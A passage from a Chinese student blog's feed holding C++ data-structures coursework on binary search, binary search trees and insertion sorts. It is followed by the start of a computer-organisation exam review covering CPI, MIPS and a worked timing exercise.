class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//**折半查找**//</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> key;<span class="comment">//查找表中每个数据元素的值</span></span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    ElemType *elem;<span class="comment">//存放查找表中数据元素的数组</span></span><br><span class="line">    <span class="keyword">int</span> length;<span class="comment">//记录查找表中数据的总数量</span></span><br><span class="line">&#125;SSTable;</span><br><span class="line"><span class="comment">//**二叉排序树**//</span></span><br><span class="line"><span class="keyword">int</span> m=<span class="number">-1</span>;   <span class="comment">//二叉排序树初始化计数</span></span><br><span class="line"><span class="keyword">int</span> n=<span class="number">0</span>;    <span class="comment">//二叉排序树关键字序列下标和查找次数计数</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="built_in">string</span> key;<span class="comment">//查找表中每个数据元素的值</span></span><br><span class="line">    <span class="keyword">int</span> position;<span class="comment">//结点在关键字序列中的位置</span></span><br><span class="line">&#125;ElemType2;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BSTNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType2 data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BSTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span> <span class="comment">//左右孩子指针</span></span><br><span class="line">&#125;BSTNode,*BSTree;</span><br><span class="line"><span class="comment">//**排序**//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span>  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>  key;   <span class="comment">//关键字项</span></span><br><span class="line">&#125;RedType;                     <span class="comment">//记录类型</span></span><br><span class="line"><span class="keyword">typedef</span>  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    RedType  r[MAXSIZE+<span class="number">1</span>]; <span class="comment">//r[0]闲置</span></span><br><span class="line">    <span class="keyword">int</span>  length;  <span class="comment">//顺序表长度</span></span><br><span class="line">&#125;SqList;  <span class="comment">//顺序表类型</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateList</span><span class="params">(SSTable &amp;ST)</span></span>;   <span class="comment">//创建有序线性表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Search_Bin</span><span class="params">(SSTable ST,<span class="keyword">int</span> key)</span></span>;   <span class="comment">//折半查找</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateTree</span><span class="params">(BSTree &amp;T)</span></span>; <span class="comment">//创建二叉链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse</span><span class="params">(BSTree T)</span></span>; <span class="comment">//中序遍历</span></span><br><span class="line"><span class="function">BSTree <span class="title">SearchBST</span><span class="params">(BSTree T,  <span class="built_in">string</span> key)</span></span>;<span class="comment">//二叉树的递归查找</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitList</span><span class="params">(SqList &amp;L)</span></span>;<span class="comment">//初始化及赋初始值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OutputKey</span><span class="params">(SqList &amp;L)</span></span>;  <span class="comment">//输出当前顺序表数值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertSort</span><span class="params">(SqList &amp;L)</span></span>;<span class="comment">//直接插入排序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BInsertSort</span><span class="params">(SqList &amp;L)</span></span>;  <span class="comment">//折半插入排序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>;  <span class="comment">//文字菜单提示信息</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SSTable ST;</span><br><span class="line">    BSTree T;</span><br><span class="line">    SqList L;</span><br><span class="line">    Menu();</span><br><span class="line">    <span class="keyword">int</span> i;  <span class="comment">//输入的数字</span></span><br><span class="line">    <span class="keyword">int</span> key;<span class="built_in">string</span> key2;    <span class="comment">//输入的待查元素</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span>(i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                CreateList(ST);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入待查元素:"</span>;</span><br><span class="line">                <span class="built_in">cin</span>&gt;&gt;key;</span><br><span class="line">                Search_Bin(ST,key);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                CreateTree(T);</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"二叉排序树创建成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"其中序遍历结果为:"</span>;</span><br><span class="line">                n=<span class="number">0</span>;    <span class="comment">//置二叉排序树关键字序列下标从0开始</span></span><br><span class="line">                InOrderTraverse(T);</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入待查元素:"</span>;</span><br><span class="line">                <span class="built_in">cin</span>&gt;&gt;key2;</span><br><span class="line">                n=<span class="number">0</span>;    <span class="comment">//置查找次数为0</span></span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"待查元素为第"</span>&lt;&lt;SearchBST(T,key2)-&gt;data.position+<span class="number">1</span>&lt;&lt;<span class="string">"个元素,"</span>;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"共查找了"</span>&lt;&lt;n&lt;&lt;<span class="string">"次"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"顺序表初始化成功,"</span>;</span><br><span class="line">                InitList(L);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                InsertSort(L);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                BInsertSort(L);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">if</span>(i&lt;<span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入的位置非法，请重新输入"</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//**折半查找**//</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateList</span><span class="params">(SSTable &amp;ST)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ST.elem=<span class="keyword">new</span> ElemType[MAXSIZE];</span><br><span class="line">    <span class="keyword">if</span>(!ST.elem)    <span class="built_in">cout</span>&lt;&lt;<span class="string">"存储分配失败"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    ST.length=<span class="number">11</span>;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">11</span>]=&#123;<span class="number">5</span>,<span class="number">16</span>,<span class="number">20</span>,<span class="number">27</span>,<span class="number">30</span>,<span class="number">36</span>,<span class="number">44</span>,<span class="number">55</span>,<span class="number">60</span>,<span class="number">67</span>,<span class="number">71</span>&#125;;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"有序线性表创建成功，其数值为:"</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=ST.length; i++)    <span class="comment">//从下标1开始存储</span></span><br><span class="line">    &#123;</span><br><span class="line">        ST.elem[i].key=a[i<span class="number">-1</span>];    <span class="comment">//设置初始顺序表数值</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ST.elem[i].key&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Search_Bin</span><span class="params">(SSTable ST,<span class="keyword">int</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> low=<span class="number">1</span>;<span class="keyword">int</span> high=ST.length;<span class="keyword">int</span> mid;</span><br><span class="line">    <span class="keyword">int</span> times=<span class="number">0</span>;<span class="keyword">bool</span> isHave=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">while</span>(low&lt;=high)</span><br><span class="line">    &#123;</span><br><span class="line">        mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">        times++;    <span class="comment">//查找次数</span></span><br><span class="line">        <span class="keyword">if</span>(key==ST.elem[mid].key)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"待查元素为第"</span>&lt;&lt;mid&lt;&lt;<span class="string">"个元素,共查找了"</span>&lt;&lt;times&lt;&lt;<span class="string">"次"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            isHave=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(key&lt;ST.elem[mid].key)   high=mid<span class="number">-1</span>; <span class="comment">//在前面找</span></span><br><span class="line">        <span class="keyword">else</span> low=mid+<span class="number">1</span>; <span class="comment">//在后面找</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!isHave)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"待查元素不在有序表中，共查找了"</span>&lt;&lt;times&lt;&lt;<span class="string">"次"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//**二叉排序树**//</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateTree</span><span class="params">(BSTree &amp;T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> ch[<span class="number">13</span>]=&#123;<span class="string">"45"</span>,<span class="string">"24"</span>,<span class="string">"12"</span>,<span class="string">"#"</span>,<span class="string">"#"</span>,<span class="string">"37"</span>,<span class="string">"#"</span>,<span class="string">"#"</span>,<span class="string">"53"</span>,<span class="string">"#"</span>,<span class="string">"93"</span>,<span class="string">"#"</span>,<span class="string">"#"</span>&#125;;</span><br><span class="line">    m+=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(ch[m]==<span class="string">"#"</span>)</span><br><span class="line">        T=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        T=<span class="keyword">new</span> BSTNode;</span><br><span class="line">        T-&gt;data.key=ch[m];</span><br><span class="line">        CreateTree(T-&gt;lchild);    <span class="comment">//递归创建左子树</span></span><br><span class="line">        CreateTree(T-&gt;rchild);    <span class="comment">//递归创建右子树</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse</span><span class="params">(BSTree T)</span> <span class="comment">//中序遍历</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T)</span><br><span class="line">    &#123;</span><br><span class="line">        InOrderTraverse(T-&gt;lchild); <span class="comment">//中序遍历左子树</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;T-&gt;data.key&lt;&lt;<span class="string">" "</span>;  <span class="comment">//访问根节点</span></span><br><span class="line">        T-&gt;data.position=n;</span><br><span class="line">        n++;</span><br><span class="line">        InOrderTraverse(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BSTree <span class="title">SearchBST</span><span class="params">(BSTree T,  <span class="built_in">string</span> key)</span><span class="comment">//二叉树的递归查找</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n++;</span><br><span class="line">    <span class="keyword">if</span>((!T) || key==T-&gt;data.key) <span class="keyword">return</span> T;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (key&lt;T-&gt;data.key)</span><br><span class="line">        <span class="keyword">return</span> SearchBST(T-&gt;lchild,key); <span class="comment">//在左子树中继续查找</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> SearchBST(T-&gt;rchild,key); <span class="comment">//在右子树中继续查找</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//**排序**//</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitList</span><span class="params">(SqList &amp;L)</span><span class="comment">//初始化且赋初始值</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">8</span>]=&#123;<span class="number">49</span>,<span class="number">38</span>,<span class="number">65</span>,<span class="number">97</span>,<span class="number">76</span>,<span class="number">13</span>,<span class="number">27</span>,<span class="number">49</span>&#125;;</span><br><span class="line">    L.length=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">8</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        L.r[i].key=a[i<span class="number">-1</span>];</span><br><span class="line">        L.length++;</span><br><span class="line">    &#125;</span><br><span class="line">    OutputKey(L);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OutputKey</span><span class="params">(SqList &amp;L)</span> <span class="comment">//输出当前顺序表数值</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"当前顺序表值为:"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">8</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;L.r[i].key&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertSort</span><span class="params">(SqList &amp;L)</span><span class="comment">//直接插入排序</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=L.length;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( L.r[i].key&lt;L.r[i<span class="number">-1</span>].key)<span class="comment">//将L.r[i]插入有序子表</span></span><br><span class="line">        &#123;</span><br><span class="line">            L.r[<span class="number">0</span>]=L.r[i]; <span class="comment">// 复制为哨兵</span></span><br><span class="line">            L.r[i]=L.r[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">int</span> j;</span><br><span class="line">            <span class="keyword">for</span>(j=i<span class="number">-2</span>; L.r[<span class="number">0</span>].key&lt;L.r[j].key;--j)</span><br><span class="line">                L.r[j+<span class="number">1</span>]=L.r[j]; <span class="comment">// 记录后移</span></span><br><span class="line">            L.r[j+<span class="number">1</span>]=L.r[<span class="number">0</span>]; <span class="comment">//插入到正确位置</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"直接插入排序成功,"</span>;</span><br><span class="line">    OutputKey(L);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BInsertSort</span><span class="params">(SqList &amp;L )</span>  <span class="comment">//折半插入排序</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>;i&lt;=L.length; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">         L.r[<span class="number">0</span>] = L.r[i];</span><br><span class="line">         <span class="keyword">int</span> low = <span class="number">1</span> ; <span class="keyword">int</span> high = i<span class="number">-1</span> ;</span><br><span class="line">         <span class="keyword">while</span> (low &lt;=high)</span><br><span class="line">         &#123;</span><br><span class="line">            m=( low + high )/<span class="number">2</span> ;</span><br><span class="line">            <span class="keyword">if</span>(L.r[<span class="number">0</span>].key &lt; L.r[m]. key)</span><br><span class="line">                high = m <span class="number">-1</span> ;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                low = m + <span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=i<span class="number">-1</span>; j&gt;=high+<span class="number">1</span>; --j)</span><br><span class="line">            L.r[j+<span class="number">1</span>] = L.r[j];</span><br><span class="line">        L.r[high+<span class="number">1</span>] = L.r[<span class="number">0</span>];</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="built_in">cout</span>&lt;&lt;<span class="string">"折半插入排序成功,"</span>;</span><br><span class="line">     OutputKey(L);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"---------------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"********by 夏日********"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"---------------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"1-----创建有序线性表(折半查找前提)"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"2-----折半查找"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"3-----创建二叉排序树 "</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"4-----二叉排序树查找"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"5-----顺序表初始化及赋初始值"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"6-----直接插入排序"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"7-----折半插入排序"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"   退出,输入一个负数！"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="shu-chu-shi-li">输出示例</h1><p>1.创建有序线性表<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200612120802268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>2.折半查找<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200612120920647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>3.创建二叉排序树<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200612120943210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>4.二叉排序树查找<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200612120953288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>5.顺序表初始化<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200612121003104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>6.直接插入排序<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020061212101316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>7.折半插入排序<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200612121020825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;shi-yan-xing-zhi-zong-he-xing-shi-yan&quot;&gt;实验性质：综合性实验&lt;/h1&gt;
&lt;h1 id=&quot;yao-qiu&quot;&gt;要求：&lt;/h1&gt;
&lt;p&gt;（1）采用邻接矩阵/邻接表建立图；&lt;br&gt;
（2）采用深度优先/广度优先搜索方式遍历图；&lt;br&gt;
      
    
    </summary>
    
    
      <category term="数据结构" scheme="http://zssblog.top/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
      <category term="数据结构" scheme="http://zssblog.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>计算机组成原理期末总结</title>
    <link href="http://zssblog.top/2020/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E6%9C%9F%E6%9C%AB%E6%80%BB%E7%BB%93/"/>
    <id>http://zssblog.top/2020/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E6%9C%9F%E6%9C%AB%E6%80%BB%E7%BB%93/</id>
    <published>2020-06-09T14:32:00.000Z</published>
    <updated>2020-06-28T09:41:12.565Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xie-zai-qian-mian">写在前面</h1><p>为迎接期末，总结了下知识点，供个人复习使用，仅供参考。</p><p>本文用到的复习资料：<a href="https://pan.baidu.com/s/1s4kU4UtgG7xiUyssDvuwKw" target="_blank" rel="noopener">点我跳转</a>，提取码：1l49</p><p>若需要本文markdown文件下方评论留言看到即回</p><h1 id="ji-suan-ji-xi-tong-gai-lun">计算机系统概论</h1><h2 id="zhi-shi-dian" id="知识点"><a class="header-anchor" href="#知识点">¶</a>知识点</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200608144821042.png"  alt="image-20200608144821042" style="zoom: 67%;" /><p>1.时钟周期是计算机中最基本的、最小的时间单位。在一个时钟周期内，CPU仅完成一个最基本的动作。</p><p>2.主频(时钟频率)：每秒钟含有多少个时钟周期(1.2GHz即每秒钟含有1.2x10<sup>9</sup>个时钟周期)。</p><p>3.CPI：一条指令所需要的时钟周期个数。</p><p>4.MIPS：每秒钟能执行多少个==100万==条指令。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020021912112010.png"  alt=""></p><p>5.MFLOPS：每秒百万次浮点操作次数。</p><p>6.CPU执行时间：TCPU=In×CPI×TC (指令条数*一条指令需要几个时钟周期*时钟周期长度)</p><blockquote><p>In：执行程序中==指令==的==总数==</p><p>CPI(Clock Cycle Per Instruction)：执行每条==指令所需==的平均时钟==周期个数==<br>TC：时钟==周期时间==的长度</p></blockquote><p>7.吞吐量：计算机某一时间间隔内能够处理的信息量(能吞多少)</p><p>8.响应时间：从事件开始到事件结束的时间,也称执行时间.</p><p>7.冯●诺依曼型计算机设计思想主要有两项:</p><ul><li>将十进制改为二进制,从而太太简化了计算机的结构和运算过程;</li><li>存储程序的思想，将<strong>程序与数据</strong>一起存储在计算机内，使得计算机的全部运算成为真正的自动过程。</li></ul><blockquote><p>存储（程序）并按（地址）顺序执行，这是冯•诺依曼型计算机的工作原理。</p></blockquote><p>8.用嘴(一句一句最后生成目标程序)来解释，用手(一步到位最后不生成目标程序)来编译</p><p>编译程序将高级语言转换为机器代码再执行，解释程序用源程序直接解释，解释一句执行一句不用转换成机器代码。所以编译要比解释速度快</p><p>9.控制器可根据==不同的周期==(取指周期或者执行周期)来区分该地址的存储单元存储的是数据还是指令。</p><h2 id="xi-ti" id="习题"><a class="header-anchor" href="#习题">¶</a>习题</h2><p>1.假定机器M的时钟频率为200MHz，程序P在机器M上的执行时间为12s。对P优化，将所有乘4指令都换成了一条左移两位的指令，得到优化后的程序P’。若在M上乘法指令的CPI为102，左移指令的CPI为2，P的执行时间是P’执行时间的1.2倍，则P中的乘法指令条数为_______4x10<sup>6</sup>________</p><p>答：P’的执行时间为10s,比12少了2s，由时钟频率得每秒有2x10<sup>8</sup>个时钟周期，即少了4x10<sup>8</sup>个时钟周期</p><p>每条左移指令比乘法指令少了100个时钟周期，那么乘法指令个数即总共少的时钟周期/每条指令少的时钟周期</p><blockquote><p>p和p’的时间差是因为指令被替换了，而所有被替换的指令个数就是乘法指令个数</p></blockquote><p>2.此题MIPS为400</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200608152105898.png"  